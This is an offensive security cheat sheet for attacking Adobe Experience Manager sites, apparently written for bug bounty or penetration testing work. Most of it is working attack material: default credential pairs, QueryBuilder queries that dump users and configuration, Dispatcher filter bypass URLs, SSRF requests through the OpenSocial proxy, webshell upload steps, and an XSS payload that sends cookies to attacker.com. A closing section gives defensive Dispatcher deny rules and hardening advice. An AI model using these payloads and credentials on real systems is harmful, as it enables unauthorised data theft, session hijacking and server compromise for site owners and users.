## 1. Overview

Adobe Experience Manager (AEM) is a comprehensive content management solution for building websites, mobile apps, and forms. From a security perspective, AEM presents several attack surfaces:

- **Dispatcher Bypass Vulnerabilities**: Filtering mechanisms can be circumvented to access restricted endpoints
- **Information Disclosure**: Exposed APIs and interfaces can leak sensitive repository data
- **Default Credentials**: Common in development/testing environments
- **SSRF Capabilities**: Proxy endpoints can be leveraged for server-side request forgery
- **Authentication/Authorization Flaws**: Improper access controls on sensitive paths

AEM installations typically consist of Author and Publish tiers, with the Dispatcher acting as a security layer. Misconfigurations in the Dispatcher are a primary source of vulnerabilities.

## 2. Exploitation Methods

### Initial Reconnaissance

**Step 1: Identify AEM Installation**

```bash
# Common AEM indicators
/content/
/etc/
/libs/
/apps/
/crx/
```

**Step 2: Automated Discovery**

```bash
# aem-hacker tool
python3 aem_discoverer.py --file list.txt

# aemscan
python3 aemscan.py -u https://target.com
```

**Step 3: Comprehensive Enumeration**

```bash
# aem-hacker with SSRF testing
python3 aem_hacker.py -u https://target.com --host [SSRF_CALLBACK]
```

### Default Credential Testing

Test these common credential pairs:

```
admin:admin
author:author
anonymous:anonymous
replication-receiver:replication-receiver
jdoe@geometrixx.info:jdoe
aparker@geometrixx.info:aparker
grios:password
vgnadmin:vgnadmin
james.devore@spambob.com:password
matt.monroe@mailinator.com:password
aaron.mcdonald@mailinator.com:password
jason.werner@dodgit.com:password
```

**Target Login Endpoints:**

- `/libs/granite/core/content/login.html`
- `/crx/explorer/`
- `/system/console`

### Information Disclosure Exploitation

**QueryBuilder API Access:**

```bash
# Basic query
https://target.com/bin/querybuilder.json?path=/content&p.limit=-1

# Retrieve all nodes
https://target.com/bin/querybuilder.json?type=nt:base&p.limit=-1
```

**Exposed Sensitive Paths:**

```bash
# Disk usage report (unauthenticated browsing)
/etc/reports/diskusage.html

# User agent test page (potential XSS)
/etc/mobile/useragent-test.html

# Repository browsing
/crx/de/index.jsp
```

### SSRF via Proxy Endpoint

```bash
# OpenSocial proxy exploitation
POST /libs/opensocial/proxy HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

url=http://internal-system:8080/admin
```

## 3. Bypasses

### CVE-2016-0957: Dispatcher Filter Bypass

**Technique Overview:** The Dispatcher filter can be bypassed by appending fake extensions or using path manipulation to access restricted endpoints like `/bin/querybuilder.json`.

**Bypass Payloads:**

```bash
# Fake extension bypass
https://target.com/bin/querybuilder.json/a.css
https://target.com/bin/querybuilder.json/a.html
https://target.com/bin/querybuilder.json/a.ico
https://target.com/bin/querybuilder.json/a.png
https://target.com/bin/querybuilder.json/a.1.json

# Newline injection
https://target.com/bin/querybuilder.json;%0aa.css

# Path traversal/duplication
https://target.com///bin///querybuilder.json
https://target.com///etc.json

# Selector abuse
https://target.com/system/console.css
https://target.com/crx/de.html
```

**Impact:** These bypasses expose the Publish tier to:

- Unauthenticated content browsing
- SSRF via proxy endpoints
- XSS vulnerabilities
- Information disclosure

## 4. Payloads

### QueryBuilder Exploitation

```bash
# 1. Extract all user information
/bin/querybuilder.json?path=/home/users&1_property=rep:principalName&1_property.value=%&type=rep:User&p.limit=-1

# 2. Find sensitive configuration
/bin/querybuilder.json?path=/apps&p.limit=-1&1_property=jcr:title&1_property.value=password

# 3. Enumerate content structure
/bin/querybuilder.json?type=cq:Page&path=/content&p.limit=-1

# 4. Search for specific file types
/bin/querybuilder.json?type=nt:file&path=/content&p.limit=-1

# 5. Extract workflow models
/bin/querybuilder.json?path=/etc/workflow&p.limit=-1

# 6. Find replication agents
/bin/querybuilder.json?path=/etc/replication&p.limit=-1

# 7. Dump all properties
/bin/querybuilder.json?1_property=*&p.limit=-1&p.hits=full

# 8. Search node by name
/bin/querybuilder.json?nodename=admin&p.limit=-1

# 9. Full-text search
/bin/querybuilder.json?fulltext=password&p.limit=-1

# 10. Extract group membership
/bin/querybuilder.json?path=/home/groups&type=rep:Group&p.limit=-1
```

## 5. Higher Impact Scenarios

### Full Repository Access

**Scenario:** Combine dispatcher bypass with QueryBuilder to extract entire content repository

```bash
# Extract all content nodes
https://target.com/bin/querybuilder.json/a.css?type=nt:base&p.limit=-1&p.hits=full
```

**Impact:** Complete information disclosure including user data, configurations, and sensitive documents

### SSRF to Internal Network Compromise

**Scenario:** Leverage OpenSocial proxy to scan and attack internal infrastructure

```bash
# Port scanning
POST /libs/opensocial/proxy.json/a.css
Content-Type: application/x-www-form-urlencoded

url=http://192.168.1.1:22
```

**Impact:** Internal network reconnaissance, access to internal services, credential harvesting

### Remote Code Execution via Package Upload

**Scenario:** With author access (via default creds), upload malicious package

**Steps:**

1. Access Package Manager: `/crx/packmgr/`
2. Upload crafted package with JSP webshell
3. Install package
4. Execute webshell at deployed location

**Impact:** Complete server compromise, data exfiltration, lateral movement

### XSS to Session Hijacking

**Scenario:** Exploit reflected XSS in user agent test page to steal admin sessions

```bash
/etc/mobile/useragent-test.html?device=<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

**Impact:** Admin session takeover, unauthorized content modification

### Authentication Bypass to Admin Console

**Scenario:** Dispatcher bypass to access Felix Console without authentication

```bash
https://target.com/system/console.css/bundles
```

**Impact:** System configuration access, bundle manipulation, potential RCE

## 6. Mitigations

### Dispatcher Configuration

**Implement Strict Filtering:**

```apache
# Block sensitive paths
/0001 { /type "deny" /url "/bin/*" }
/0002 { /type "deny" /url "/crx/*" }
/0003 { /type "deny" /url "/system/*" }
/0004 { /type "deny" /url "/etc/*" }

# Whitelist only required selectors
/0010 { /type "allow" /url "/content/*.html" }
```

**Prevent Bypass Techniques:**

- Remove support for double slashes
- Validate file extensions strictly
- Block newline characters in URLs
- Implement suffix whitelisting

### Authentication & Authorization

**Remove Default Credentials:**

```bash
# Change all default passwords immediately
# Delete unused demo accounts
# Implement strong password policies
```

**Restrict Anonymous Access:**

- Configure proper ACLs on `/content`, `/apps`, `/libs`
- Disable anonymous read access to repository
- Require authentication for all sensitive endpoints

### Endpoint Hardening

**Disable Dangerous Servlets:**

```xml
<!-- Disable QueryBuilder for anonymous users -->
<service>
    <servlet>org.apache.sling.servlets.get.DefaultGetServlet</servlet>
    <property name="sling.servlet.paths">/bin/querybuilder</property>
    <property name="service.ranking" type="Integer">0</property>
</service>
```

**Remove SSRF-Prone Components:**

- Disable OpenSocial proxy: `/libs/opensocial/proxy`
- Remove or restrict feed proxy servlets
- Validate and whitelist external request destinations

### Security Headers & Monitoring

**Implement Security Headers:**

```apache
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'"
```

**Enable Comprehensive Logging:**

- Monitor failed authentication attempts
- Log QueryBuilder usage
- Alert on suspicious Dispatcher bypass patterns
- Track package installations and modifications

### Regular Security Assessments

**Checklist:**

- [ ] Audit Dispatcher filter rules quarterly
- [ ] Scan for default credentials monthly
- [ ] Review user permissions and ACLs
- [ ] Test for known CVEs and apply patches
- [ ] Perform penetration testing annually
- [ ] Monitor security advisories from Adobe

---

## Tools & Resources

### Automated Scanning Tools

- **aem-hacker**: https://github.com/0ang3el/aem-hacker
- **aemscan**: https://github.com/Raz0r/aemscan

### Wordlists for Fuzzing

- **AEM Paths**: https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths
- **AEM Paths (Alternative)**: https://github.com/emadshanab/Adobe-Experience-Manager/blob/main/aem-paths.txt

### Learning Resources

- **Approaching AEM Webinar**: https://www.bugcrowd.com/resources/webinar/aem-hacker-approaching-adobe-experience-manager-web-apps/
- **Securing AEM Presentation**: https://www.slideshare.net/0ang3el/securing-aem-webapps-by-hacking-them
- **Hunting for Security Bugs in AEM**: https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps
- **Adobe CQ Pentesting Guide**: https://www.infosecinstitute.com/resources/penetration-testing/adobe-cq-pentesting-guide-part-1/

---

**Pro Tip:** Start your AEM assessment with automated tools for quick wins, then manually verify findings with dispatcher bypass techniques. Focus on QueryBuilder API exposure—it's the fastest path to demonstrating high-impact information disclosure! 🎯